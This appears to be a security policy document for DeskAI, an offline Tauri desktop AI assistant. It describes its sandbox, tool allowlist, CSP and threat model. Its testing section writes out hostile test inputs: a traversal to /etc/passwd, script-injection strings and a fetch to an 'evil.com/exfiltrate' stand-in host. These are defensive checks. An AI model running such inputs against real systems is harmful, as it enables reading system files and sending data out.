# Security Considerations

## Overview

DeskAI is designed with security as a first-class concern. This document outlines the security features and best practices implemented in the application.

## Security Features

### 1. Network Isolation

**Zero Network Access**
- No HTTP/HTTPS libraries or dependencies
- No fetch, axios, or XMLHttpRequest calls
- Tauri configuration blocks all HTTP requests
- Content Security Policy (CSP) prevents external resource loading

```json
"http": {
  "all": false,
  "request": false
}
```

### 2. Filesystem Restrictions

**Sandboxed File Operations**
All file operations are restricted to the `out/` directory:

```typescript
function validatePath(filePath: string): string {
  const resolvedPath = path.resolve(OUT_DIR, filePath);
  if (!resolvedPath.startsWith(OUT_DIR)) {
    throw new Error(`Access denied: Path must be within out/ directory`);
  }
  return resolvedPath;
}
```

**Protection Against:**
- Directory traversal attacks (e.g., `../../../etc/passwd`)
- Absolute path access to system files
- Symbolic link attacks

**Tauri Filesystem Allowlist:**
```json
"fs": {
  "all": false,
  "readFile": true,
  "writeFile": true,
  "readDir": true,
  "createDir": true,
  "removeDir": false,
  "removeFile": false,
  "renameFile": true,
  "exists": true,
  "scope": ["$APPDATA/deskai/out/*", "$APPDATA/deskai/documents/*"]
},
"dialog": {
  "all": false,
  "open": true,
  "save": true
}
```

**Note on Folder Selection:**
- File dialog permissions allow users to select folders
- Selected folders are accessed through validated paths only
- No automatic access to system directories
- User must explicitly grant access via dialog

### 3. Tool Allowlisting

**Explicit Tool Registration**
Only explicitly registered tools can be executed:

```typescript
export class ToolRegistry {
  private tools: Map<string, Tool> = new Map();

  registerTool(tool: Tool): void {
    if (tool.isAllowed()) {
      this.tools.set(tool.name, tool);
    }
  }
}
```

**Allowed Tools:**

*Basic Tools:*
- `file_write` - Write to out/ directory only
- `file_read` - Read from out/ directory only
- `calculator` - Sanitized arithmetic operations
- `text_analysis` - Read-only text analysis

*Secretary Tools:*
- `file_manager` - Manage files with metadata (restricted to user-selected folders)
- `document_processor` - Extract text from PDFs and documents (offline libraries)
- `writing` - Create and edit documents (sandboxed to out/documents/)
- `ocr` - Extract text from images using Tesseract.js (offline)
- `handwriting` - Recognize handwriting (offline via Tesseract.js)

### 4. Input Sanitization

**Calculator Tool**
Prevents code injection by sanitizing expressions:

```typescript
// Only allows numbers and basic operators
const sanitized = params.expression.replace(/[^0-9+\-*/().\s]/g, '');

if (sanitized !== params.expression) {
  throw new Error('Invalid expression: only numbers and basic operators allowed');
}
```

**Protected Against:**
- JavaScript injection via eval
- Function calls (e.g., `alert()`, `fetch()`)
- Property access (e.g., `window.location`)

### 5. Content Security Policy

**Strict CSP Configuration**
```json
"csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
```

**Protection:**
- No external scripts
- No external stylesheets
- No external resources
- Inline scripts/styles allowed for React

### 6. Shell Restrictions

**No Shell Access**
```json
"shell": {
  "all": false,
  "execute": false,
  "open": false
}
```

**Prevention:**
- No arbitrary command execution
- No shell spawning
- No process manipulation

## Threat Model

### Threats Mitigated

1. **Network-based attacks** ✓
   - No network access = no remote code execution
   - No data exfiltration via network

2. **Filesystem attacks** ✓
   - Directory traversal prevented
   - System file access blocked
   - Limited to sandboxed directory

3. **Code injection** ✓
   - Input sanitization for calculator
   - No eval of untrusted code
   - Function constructor used safely

4. **Resource exhaustion** ✓
   - Deterministic operations
   - No infinite loops in tools
   - Bounded computations

### Remaining Considerations

1. **Local Model Security**
   - When integrating real models, ensure they don't have network access
   - Validate model outputs before displaying
   - Consider resource limits for model inference

2. **Dependencies**
   - Keep dependencies updated
   - Regular security audits with `npm audit`
   - Minimize dependency count
   - **New dependencies for secretary features:**
     - `pdf-parse`: PDF parsing library (no network, pure JS)
     - `tesseract.js`: OCR library (offline after initial language data download)

3. **Tauri Updates**
   - Keep Tauri version current
   - Monitor Tauri security advisories
   - Test security features after updates

4. **OCR and PDF Libraries**
   - Tesseract.js downloads language data on first use (requires internet once)
   - After initial setup, fully offline
   - pdf-parse is pure JavaScript with no network dependencies
   - Both libraries process user files locally without external API calls

5. **User-Selected Folders**
   - File manager can access folders selected via dialog
   - Path validation prevents traversal attacks
   - No automatic access to sensitive directories
   - User maintains control over which folders are accessible

## Best Practices for Extension

### Adding New Tools

1. **Validate all inputs**
```typescript
async execute(params: any): Promise<any> {
  if (!params.requiredField) {
    throw new Error('Field is required');
  }
  // Validate and sanitize params
}
```

2. **Implement isAllowed()**
```typescript
isAllowed(): boolean {
  // Return false to disable tool
  return true;
}
```

3. **Avoid dangerous operations**
- No shell execution
- No arbitrary file system access
- No network calls
- No eval or Function with untrusted input

### Connecting Local Models

1. **Use local-only runners**
   - Ollama (local mode)
   - llama.cpp
   - LocalAI

2. **Disable network in model runner**
   - Configure runner to block network
   - Verify no telemetry

3. **Validate model outputs**
   - Sanitize before rendering
   - Check for injection attempts
   - Limit output length

## Security Testing

### Manual Testing

1. **Directory Traversal**
```bash
# Should fail
file_write("../../../etc/passwd", "malicious")
file_read("../../../etc/passwd")
```

2. **Code Injection**
```bash
# Should fail
calculator("alert('xss')")
calculator("process.exit()")
```

3. **Network Access**
```bash
# Should fail (no fetch function available)
fetch("https://evil.com/exfiltrate")
```

### Automated Testing

Run the test suite:
```bash
npm test
```

Tests include:
- Filesystem security validation
- Input sanitization
- Tool allowlisting
- Deterministic behavior

## Reporting Security Issues

If you discover a security vulnerability:

1. **Do not** open a public issue
2. Email the maintainers privately
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

## Security Checklist for Deployment

- [ ] All tests passing
- [ ] No security warnings in `npm audit`
- [ ] Tauri version is current
- [ ] CSP configured correctly
- [ ] Filesystem scope limited
- [ ] Network access disabled
- [ ] Shell access disabled
- [ ] Input validation implemented
- [ ] Tool allowlist reviewed
- [ ] Code reviewed for security issues

## References

- [Tauri Security Guide](https://tauri.app/v1/guides/security/)
- [OWASP Desktop App Security](https://owasp.org/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
